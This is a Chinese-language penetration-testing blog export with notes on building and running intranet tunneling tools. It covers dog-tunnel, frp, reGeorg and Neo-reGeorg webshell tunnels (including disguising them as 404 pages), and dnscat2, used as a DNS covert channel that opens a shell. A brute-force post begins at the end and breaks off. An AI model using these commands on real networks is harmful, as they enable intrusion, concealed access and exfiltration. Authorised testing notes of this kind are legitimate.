<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、go (添加环境变量)</span><br><span class="line"><span class="meta">#</span><span class="bash"> https://studygolang.com/dl  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://studygolang.com/dl/golang/go1.13.1.windows-amd64.msi</span></span><br><span class="line"></span><br><span class="line">2、mingw64(GCC编译器，添加环境变量)</span><br><span class="line"><span class="meta">#</span><span class="bash"> https://sourceforge.net/projects/mingw-w64/files/Toolchains%20targetting%20Win64/Personal%20Builds/mingw-builds/8.1.0/threads-posix/seh/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://nchc.dl.sourceforge.net/project/mingw-w64/Toolchains targetting Win64/Personal Builds/mingw-builds/8.1.0/threads-posix/seh/x86_64-8.1.0-release-posix-seh-rt_v6-rev0.7z</span></span><br></pre></td></tr></table></figure>

<ul>
<li>打开CMD(任意目录)，执行以下命令：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go get github.com/klauspost/reedsolomon</span><br><span class="line">go get github.com/cznic/zappy</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装依赖，我这里不是以管理员命令执行的。因此安装以后文件在：C:\Users\aa\go\src\github.com\</span></span><br></pre></td></tr></table></figure>

<ul>
<li>然后下载dog-tunnel-lite进行编译(注意自己的路径)：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go get -u -d github.com/vzex/dog-tunnel # 下载dog-tunnel</span><br><span class="line">cd C:\Users\aa\go\src\github.com\vzex\dog-tunnel  # 切换到文件下载目录</span><br><span class="line">git checkout udpVersion  # 选择dog-tunnel-lite版本(也即是udpVersion)</span><br><span class="line">go build client.go</span><br></pre></td></tr></table></figure>

<p>然后发现<code>C:\Users\aa\go\src\github.com\vzex\dog-tunnel</code>出现了client.exe即dog-tunnel-lite_x64。</p>
<h4 id="windows编译-x86"><a href="#windows编译-x86" class="headerlink" title="windows编译 x86"></a>windows编译 x86</h4><ul>
<li><p>首先将之前生成的client.exe移动到其他目录或者删除。(紧接着x64的，注意目录)</p>
</li>
<li><p>使用<code>go env</code>命令,查看系统的配置环境,可以看到GOARCH(当前系统)是amd64</p>
</li>
<li><p>执行 <code>set GOARCH=386</code> 配置go输出系统平台为32位,然后查看是否成功。(一下操作在当前窗口进行操作)</p>
</li>
<li><p>go build client.go，即可，查看属性-&gt;兼容性-&gt;设置，其中为可选即为32位，winhex在文件头中能找到<br>&gt;&gt;&gt;PE..d 的是64位<br>&gt;&gt;&gt;PE..L 的是32位</p>
</li>
<li><p>然后还原go,执行<code>set GOARCH=amd64</code></p>
</li>
</ul>
<h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><blockquote>
<p>我个人主要是使用端口转发以及Socks5代理。</p>
</blockquote>
<p>其他细节请参考<code>https://github.com/vzex/dog-tunnel/blob/lite_v1.41/HowToUse.txt</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">参数说明  v1.20</span><br><span class="line">    所有参数前面加了c/s字样，用于描述参数的可使用范围</span><br><span class="line">    c表示只能客户端使用，s只能服务端</span><br><span class="line">    cs代表两端必须一致 c|s代表两端都可以用，可不保证一致，具体用法参考--help</span><br><span class="line">-action 指明通道行为，默认socks5（socks5代理服务）,可设置ip:port，作为端口转发用，客户端可指定该参数，当服务端指定参数时会强制采用服务端策略, 指定参数route将开启透明代理模式，windows版本不支持该模式，该模式下请自行设置用户的DNS和网关，将需要的tcp连接通过iptables转发到-local端口即可</span><br><span class="line">-auth 用于简单的登录验证，两端不一致时客户端会被断开</span><br><span class="line">-debug 调试输出,需要和-v一起使用</span><br><span class="line">-dnscache (有加速效果)当socks5(socks5_smart)模式时有效，指定dns缓存时间，默认0，单位分钟,socks5_smart模式下近端也可指定该参数,因为会有请求通过近端解析</span><br><span class="line">-encrypt 客户端指定，表示该通道是否启用消息加密</span><br><span class="line">-local 通道连通时本地监听端口，格式ip:port</span><br><span class="line">-pipe (有加速效果)通道个数，默认1</span><br><span class="line">-r 反向模式，true时客户端触发action行为，服务端监听local指定的端口</span><br><span class="line">-service 通道服务端地址，客户端指定时为连接地址，服务端指定时为监听地址，用于通道打通，双方地址一致，一般为服务端ip:port</span><br><span class="line">-tcp tcp模式，默认false，使用udp模式在网络差的环境下效率更高，cpu占用也更高(待优化),两端需一致</span><br><span class="line">-timeout 客户端执行连接超时时间，tcp模式关闭模式时有效</span><br><span class="line">-v 更多输出信息</span><br><span class="line">-version 版本信息</span><br><span class="line">-src 记录来源ip和访问目的ip</span><br><span class="line"></span><br><span class="line">-xor 两端须一致，用于udp模式握手加密,内容为任意字符串(主要用于隐藏通讯协议特征，建议设置)</span><br><span class="line">-session_timeout 指定连接会话在不活跃状态时多久（秒）后被销毁，防止被动连接的情况下产生僵尸socket，默认0不自动销毁</span><br><span class="line">-kcp 可设置kcp协议相关参数，高级用户使用，格式参考-kcp nodelay:1;snd=100; </span><br></pre></td></tr></table></figure>

<ul>
<li>Socks5代理(主要内网测试中经常用)</li>
</ul>
<p>服务端(s,也即是公网主机运行命令)，这里为Linux：</p>
<blockquote>
<p>监听1.2.3.4:1234端口。指定加密字符传-xor ddd ,指定验证字符ccc,服务端强制启用 socks5代理</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./dtunnel_lite -service 1.2.3.4:1234 -xor ddd -v -auth ccc -action socks5</span><br></pre></td></tr></table></figure>

<p>客户端(内网主机)这里为windows:</p>
<blockquote>
<p>连接到服务端1.2.3.4:1234，指定socks5代理，通道连通时候监听端口,这里使用了-r(也即是反向代理，表示服务器开放8899端口作为socks5代理。)</p>
</blockquote>
<p>这里是只要使用socks5代理即可连通内网：<code>socks5 : 1.2.3.4:8899</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\client.exe  -service 1.2.3.4:1234 -v -action socks5  -xor ddd -local :8899 -pipe 5 -session_timeout 30 -auth ccc -r</span><br></pre></td></tr></table></figure>

<ul>
<li>端口转发(经常用在不出网的数据库等。。)</li>
</ul>
<p>服务端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;dtunnel_lite -service 1.2.3.4.106:1234 -xor ddd -v -auth ccc</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<blockquote>
<p>利用反向代理，将内网主机的80端口映射到公网主机的9999端口</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\client.exe  -service 1.2.3.4:1234  -v -action 127.0.0.1:3389 -encrypt -xor ddd -local :9999 -pipe 5 -r -auth ccc -encrypt</span><br></pre></td></tr></table></figure>

<h3 id="Fpr"><a href="#Fpr" class="headerlink" title="Fpr"></a>Fpr</h3><p>只介绍常用的。</p>
<h4 id="本地编译"><a href="#本地编译" class="headerlink" title="本地编译"></a>本地编译</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先需要Go环境</span></span><br><span class="line"><span class="comment"># git clone https://github.com/fatedier/frp.git</span></span><br><span class="line">go get github.com/fatedier/frp</span><br><span class="line">make -f Makefile.cross-compiles </span><br><span class="line"><span class="comment"># 编译好的文件在 frp根目录下</span></span><br></pre></td></tr></table></figure>

<h4 id="官方成品"><a href="#官方成品" class="headerlink" title="官方成品"></a>官方成品</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/fatedier/frp/releases</span><br><span class="line"><span class="comment"># 官方编译好的，直接可用</span></span><br></pre></td></tr></table></figure>

<h4 id="使用方式-1"><a href="#使用方式-1" class="headerlink" title="使用方式"></a>使用方式</h4><p><strong>服务端：</strong></p>
<blockquote>
<p>./frps -c frps.ini</p>
</blockquote>
<p><strong>服务端通用写法：</strong></p>
<p>一般不做dashboard用法，在内网代理/转发时候。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># [common] is integral section</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment"># A literal address or host name for IPv6 must be enclosed</span></span><br><span class="line"><span class="comment"># in square brackets, as in &quot;[::1]:80&quot;, &quot;[ipv6-host]:http&quot; or &quot;[ipv6-host%zone]:80&quot;</span></span><br><span class="line"><span class="comment"># 服务端默认监听的地址及端口</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># udp port to help make udp hole to penetrate nat</span></span><br><span class="line"><span class="attr">bind_udp_port</span> = <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># udp port used for kcp protocol, it can be same with &#x27;bind_port&#x27;</span></span><br><span class="line"><span class="comment"># if not set, kcp is disabled in frps</span></span><br><span class="line"><span class="comment"># 作用和bind_port一样</span></span><br><span class="line"><span class="attr">kcp_bind_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># auth token</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">12345678</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可视化界面(frp Web界面)</span></span><br><span class="line"><span class="comment"># set dashboard_addr and dashboard_port to view dashboard of frps</span></span><br><span class="line"><span class="comment"># dashboard_addr&#x27;s default value is same with bind_addr</span></span><br><span class="line"><span class="comment"># dashboard is available only if dashboard_port is set</span></span><br><span class="line"><span class="attr">dashboard_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="comment"># dashboard user and passwd for basic auth protect, if not set, both default value is admin</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin</span><br><span class="line"><span class="attr">dashboard_pwd</span> = admin</span><br></pre></td></tr></table></figure>

<blockquote>
<p>./frpc -c frpc.ini</p>
</blockquote>
<p><strong>客户端通用写法：</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># for authentication</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">12345678</span></span><br><span class="line"><span class="comment"># set admin address for control frpc&#x27;s action by http api such as reload</span></span><br><span class="line"><span class="attr">admin_addr</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">admin_port</span> = <span class="number">7400</span></span><br><span class="line"><span class="attr">admin_user</span> = admin</span><br><span class="line"><span class="attr">admin_pwd</span> = admin</span><br><span class="line"></span><br><span class="line"><span class="section">[ssh_random]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="comment"># if remote_port is 0, frps will assign a random port for you</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h4 id="SSH转发"><a href="#SSH转发" class="headerlink" title="SSH转发"></a>SSH转发</h4><ul>
<li>第一种方式：将目标机的SSH端口转发到指定/随机端口</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh_random]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="comment"># if remote_port is 0, frps will assign a random port for you</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>第二种：设置各种参数(传输加密、数据压缩、超时时间等)</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="comment"># tcp | udp | http | https | stcp | xtcp, default is tcp(可用的协议)</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="comment"># limit bandwith for this proxy, unit is KB and MB(设置此代理的带宽)</span></span><br><span class="line"><span class="attr">bandwith_limit</span> = <span class="number">1</span>MB</span><br><span class="line"><span class="comment"># true or false, if true, messages between frps and frpc will be encrypted, default is false(设置传输加密，默认不加密)</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">false</span></span><br><span class="line"><span class="comment"># if true, message will be compressed(传输数据压缩)</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">false</span></span><br><span class="line"><span class="comment"># remote port listen by frps(转发到的端口，即client ssh:22----&gt; Server:6001)</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6001</span></span><br><span class="line"><span class="comment"># frps will load balancing connections for proxies in same group</span></span><br><span class="line"><span class="attr">group</span> = test_group</span><br><span class="line"><span class="comment"># group should have same group key</span></span><br><span class="line"><span class="attr">group_key</span> = <span class="number">123456</span></span><br><span class="line"><span class="comment"># enable health check for the backend service, it support &#x27;tcp&#x27; and &#x27;http&#x27; now</span></span><br><span class="line"><span class="comment"># frpc will connect local service&#x27;s port to detect it&#x27;s healthy status</span></span><br><span class="line"><span class="attr">health_check_type</span> = tcp</span><br><span class="line"><span class="comment"># health check connection timeout(超时时间)</span></span><br><span class="line"><span class="attr">health_check_timeout_s</span> = <span class="number">3</span></span><br><span class="line"><span class="comment"># if continuous failed in 3 times, the proxy will be removed from frps(最大错误次数，超过则删除代理)</span></span><br><span class="line"><span class="attr">health_check_max_failed</span> = <span class="number">3</span></span><br><span class="line"><span class="comment"># every 10 seconds will do a health check(检测代理的时间间隔)</span></span><br><span class="line"><span class="attr">health_check_interval_s</span> = <span class="number">10</span></span><br></pre></td></tr></table></figure>

<h4 id="HTTP-Socks5代理"><a href="#HTTP-Socks5代理" class="headerlink" title="HTTP/Socks5代理"></a>HTTP/Socks5代理</h4><p>将需要通过这个代理访问外网的内部机器的代理地址设置为192.168.90.231:6000，这样就可以通过 FRP 客户端机器的网络访问互联网了。<br> http_proxy 插件也支持认证机制，如果需要启用认证可通过配置参数 plugin_http_user 和 plugin_http_passwd 启用。<br> 如需启用 Socks5 代理，只需将 plugin 的值更换为 socks5 即可。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br><span class="line"><span class="attr">plugin</span> = http_proxy</span><br><span class="line"><span class="comment"># 设置账号密码</span></span><br><span class="line"><span class="comment"># plugin_http_user = abc</span></span><br><span class="line"><span class="comment"># plugin_http_passwd = abc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># plugin = socks5</span></span><br><span class="line"><span class="comment"># plugin_user = abc</span></span><br><span class="line"><span class="comment"># plugin_passwd = abc</span></span><br></pre></td></tr></table></figure>

<h4 id="TCP-UDP端口转发"><a href="#TCP-UDP端口转发" class="headerlink" title="TCP/UDP端口转发"></a>TCP/UDP端口转发</h4><ul>
<li>TCP协议进行端口转发，多端口需要，local_port和remote_port个数进行对应。</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[range:tcp_port]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">80</span>,<span class="number">88</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8000</span>,<span class="number">8888</span></span><br></pre></td></tr></table></figure>

<ul>
<li>UDP</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[range:udp_port]</span></span><br><span class="line"><span class="attr">type</span> = udp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">6010</span>-<span class="number">6020</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6010</span>-<span class="number">6020</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h3><p>reGeorg 是 reDuh 的升级版，主要是把内网服务器的端口通过 http/https  隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用 webshell 建立一个  socks 代理进行内网穿透，服务器必须支持 aspx、php 或 jsp 这些 web 程序中的一种。</p>
<ul>
<li>首先上传tunnel.jsp到Web服务器,浏览器访问一下，确认正常解析。然后本地运行。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://We地址/tunnel.jsp -p <span class="number">9999</span>	</span><br></pre></td></tr></table></figure>

<p>配置proxyChains或者其他代理工具。</p>
<h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0wtY29kZXMvTmVvLXJlR2Vvcmc=">https://github.com/L-codes/Neo-reGeorg<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><strong>Neo-reGeorg</strong> 是一个旨在积极重构 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3Jn">reGeorg<i class="fa fa-external-link-alt"></i></span> 的项目，目的是：</p>
<ul>
<li>提高 tunnel 连接安全性</li>
<li>提高可用性，避免特征检测</li>
<li>提高传输内容保密性</li>
<li>解决 reGeorg 现存在的问题，修复部分小BUG</li>
</ul>
<p><strong>查看帮助信息：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> π Neo-reGeorg master ❯ python3 neoreg.py generate -h</span><br><span class="line">usage: neoreg.py [-h] -k KEY [-o DIR] [-f FILE] [--read-buff Bytes]</span><br><span class="line"></span><br><span class="line">Generate neoreg webshell</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -k KEY, --key KEY     Specify connection key.</span><br><span class="line">  -o DIR, --outdir DIR  Output directory.</span><br><span class="line">  -f FILE, --file FILE  Camouflage html page file</span><br><span class="line">  --read-buff Bytes     Remote <span class="built_in">read</span> buffer.(default: 513)</span><br><span class="line">  </span><br><span class="line"> π Neo-reGeorg master ❯ python3 neoreg.py  -h</span><br><span class="line">usage: neoreg.py [-h] -u URI -k KEY [-l IP] [-p PORT] [-s] [-H LINE] [-c LINE]</span><br><span class="line">                 [-x LINE] [--read-buff Bytes] [--read-interval MS]</span><br><span class="line">                 [--max-threads N] [-v]</span><br><span class="line"></span><br><span class="line">Socks server <span class="keyword">for</span> Neoreg HTTP(s) tunneller. DEBUG MODE: -k</span><br><span class="line">(debug_all|debug_base64|debug_headers_key|debug_headers_values)</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -u URI, --url URI     The url containing the tunnel script</span><br><span class="line">  -k KEY, --key KEY     Specify connection key</span><br><span class="line">  -l IP, --listen-on IP</span><br><span class="line">                        The default listening address.(default: 127.0.0.1)</span><br><span class="line">  -p PORT, --listen-port PORT</span><br><span class="line">                        The default listening port.(default: 1080)</span><br><span class="line">  -s, --skip            Skip usability testing</span><br><span class="line">  -H LINE, --header LINE</span><br><span class="line">                        Pass custom header LINE to server</span><br><span class="line">  -c LINE, --cookie LINE</span><br><span class="line">                        Custom init cookies</span><br><span class="line">  -x LINE, --proxy LINE</span><br><span class="line">                        proto://host[:port] Use proxy on given port</span><br><span class="line">  --read-buff Bytes     Local <span class="built_in">read</span> buffer, max data to be sent per</span><br><span class="line">                        POST.(default: 2048 max: 2600)</span><br><span class="line">  --read-interval MS    Read data interval <span class="keyword">in</span> milliseconds.(default: 100)</span><br><span class="line">  --max-threads N       Proxy max threads.(default: 1000)</span><br><span class="line">  -v                    Increase verbosity level (use -vv or more <span class="keyword">for</span> greater</span><br><span class="line">                        effect)</span><br></pre></td></tr></table></figure>

<p>#####普通用法 </p>
<p>服务端：首先需要设置密码生成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python neoreg.py generate -k password</span><br><span class="line"></span><br><span class="line">    [+] Create neoreg server files:</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.nosocket.php</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.js</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.php</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.ashx</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.aspx</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jsp</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jspx</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.jsp</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.jspx</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 neoreg.py -k password -u http:&#x2F;&#x2F;xx&#x2F;tunnel.php</span><br><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">  Log Level set to [ERROR]</span><br><span class="line">  Starting socks server [127.0.0.1:1080], tunnel at [http:&#x2F;&#x2F;k&#x2F;tunnel.php]</span><br><span class="line">+------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<h4 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h4><ul>
<li>支持生成的服务端，在GET请求时响应页面内容 伪装成404等页面  自己构造404页面内容。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务端：</span><br><span class="line">$ python neoreg.py generate -k &lt;you_password&gt; --file 404.html</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">$ pytohn neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --skip</span><br></pre></td></tr></table></figure>

<ul>
<li>如果服务端（即是你传的文件）需要设置代理才能访问。可以使用参数<code>--proxy</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pytohn neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --proxy socks5:&#x2F;&#x2F;10.1.1.1:8080</span><br></pre></td></tr></table></figure>

<ul>
<li>如需Authorization认证和定制的Header或Cookie</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pytohn neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; -H &#39;Authorization: cm9vdDppcyB0d2VsdmU&#x3D;&#39; --cookie &quot;key&#x3D;value;key2&#x3D;value2&quot;</span><br></pre></td></tr></table></figure>

<h3 id="DNScat"><a href="#DNScat" class="headerlink" title="DNScat"></a>DNScat</h3><p>不想自己编译可直接下载。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;downloads.skullsecurity.org&#x2F;dnscat2&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="Linux编译-1"><a href="#Linux编译-1" class="headerlink" title="Linux编译"></a>Linux编译</h4><p>其DNS通信基于dnscat，因此其服务端需要dnscat。如果实在不能安装，参考官网。。。</p>
<p>这里仅仅是Debian10_x64 Linux。我客户端make时候报错，但是不影响。。。可以./dnscat测试一下是否正常。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">apt-get install gem</span><br><span class="line">apt-get install ruby-dev</span><br><span class="line">apt-get install libpq-dev</span><br><span class="line">apt-get install ruby-bundler</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">https://downloads.skullsecurity.org/dnscat2/ </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<ul>
<li>配置服务端，建议使用自己配置的DNS。配置A,NS 解析</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">ruby ./dnscat2.rb vps.example.com -e open -c example.com --no-cache</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务端直连模式</span></span><br><span class="line">ruby ./dnscat2.rb --dns server=127.0.0.1,port=533,<span class="built_in">type</span>=TXT --secret=example.com</span><br><span class="line"><span class="comment"># -c 定义了&#x27;pre-shared secret&#x27;,可以使用具有预共享密钥的身份验证机制来防止中间人攻击，如果未定义该参数，则会自动生成随机字符串，客户端需要</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -e 规定的安全级别  open 表示服务端允许客户端不进行加密</span></span><br><span class="line"><span class="comment"># --no-cache 禁止缓存，建议添加：powershell-dnscat2客户端与dnscat2服务器的Caching模式不兼容。</span></span><br></pre></td></tr></table></figure>

<h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><p>没有配置域名，因此试验直连。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务端  Linux</span></span><br><span class="line">ruby dnscat2.rb -s 553 -c 123</span><br><span class="line"><span class="comment"># 客户端 Win </span></span><br><span class="line">PS C:\Users\windows10\Desktop&gt; .\dnscat2-v0.07-client-win32.exe --dns server=VPS s,port=553 --secret=123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">windows	<span class="comment"># 查看连接</span></span><br><span class="line">window -i 1  <span class="comment"># 指定进入第一个连接</span></span><br><span class="line">shell. <span class="comment"># 开启SHELL连接，会新建一个连接，需要window -i 2</span></span><br><span class="line"></span><br><span class="line">卡卡卡卡卡卡卡卡卡卡卡卡卡</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>知识整理</category>
      </categories>
      <tags>
        <tag>Proxy</tag>
        <tag>总结</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>爆破小文</title>
    <url>/posts/5b1d52cc/</url>
    <content><![CDATA[<p>爆破不能说是最好的，但是，确实是很快乐的。。。</p>
<a id="more"></a>

<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><ul>
<li>岁月安好，但是总有些不太对的地方，改好密码，常改密码，健康你我他～</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9tb25pdG9yLmZpcmVmb3guY29tLw==">https://monitor.firefox.com/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9oYXZlaWJlZW5wd25lZC5jb20v">https://haveibeenpwned.com/<i class="fa fa-external-link-alt"></i></span></p>
<p>无数的工具总有一种自己喜欢的。对的时间、对的地点。哈哈哈。。。</p>
<h2 id="字典生成工具"><a href="#字典生成工具" class="headerlink" title="字典生成工具"></a>字典生成工具</h2><h3 id="pydictor"><a href="#pydictor" class="headerlink" title="pydictor"></a>pydictor</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 --branch=master https://www.github.com/landgrey/pydictor.git</span><br><span class="line"><span class="built_in">cd</span> pydictor/</span><br><span class="line">chmod +x pydictor.py</span><br><span class="line">python pydictor.py</span><br><span class="line"><span class="comment"># https://github.com/LandGrey/pydictor.git</span></span><br></pre></td></tr></table></figure>

<ul>
<li>核心参数(省略了正则，…)</li>
</ul>
